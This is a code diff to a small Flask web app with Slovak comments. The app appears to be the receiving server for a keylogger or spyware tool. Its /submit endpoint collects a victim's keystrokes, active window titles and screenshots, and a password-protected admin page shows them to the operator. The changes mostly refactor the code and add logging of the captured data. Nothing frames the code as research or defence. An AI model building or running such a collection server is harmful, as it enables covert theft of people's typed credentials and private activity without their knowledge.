@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, redirect, url_for
+from flask import Flask, request, render_template, redirect
 from datetime import datetime
 
 app = Flask(__name__)
@@ -7,7 +7,7 @@ DATA = []
 
 @app.route('/')
 def home():
-    return redirect(url_for('admin'))
+    return redirect('/admin')
 
 @app.route('/submit', methods=['POST'])
 def submit():
@@ -15,12 +15,19 @@ def submit():
     if not json_data:
         return {"status": "error", "message": "No JSON data received"}, 400
 
-    keys_value = json_data.get('keys', '')
-    # Ak je keys_value metóda alebo iný nečakaný typ, sprav string
+    keys_value = json_data.get('keys')
+
+    # Ochrana proti callable typu (metóda, ...), konvertuj na string
     if callable(keys_value):
         keys_value = str(keys_value)
+
+    # Ak keys_value nie je string, konvertuj na string
     if not isinstance(keys_value, str):
-        keys_value = str(keys_value)
+        keys_value = str(keys_value) if keys_value is not None else ""
+
+    print(f"Received keys (type {type(keys_value)}): {repr(keys_value)}")
+    print(f"Active window: {json_data.get('active_window')}")
+    print("Screenshot received" if json_data.get('screenshot') else "Screenshot missing")
 
     entry = {
         'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
@@ -32,24 +39,25 @@ def submit():
         'screenshot': json_data.get('screenshot')
     }
     DATA.append(entry)
+
     return {"status": "received"}
 
 @app.route('/admin', methods=['GET', 'POST'])
 def admin():
-    error = None
     if request.method == 'POST':
         if request.form.get('password') == PASSWORD:
-            return render_template('admin.html', data=DATA)
+            return render_template("admin.html", data=DATA)
         else:
-            error = "Zlé heslo"
-    return render_template('login.html', error=error)
+            return render_template("login.html", error="Zlé heslo")
+    return render_template("login.html")
 
 @app.route('/logout')
 def logout():
-    return redirect(url_for('admin'))
+    return redirect('/admin')
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host="0.0.0.0", port=5000)
+
 
 
 
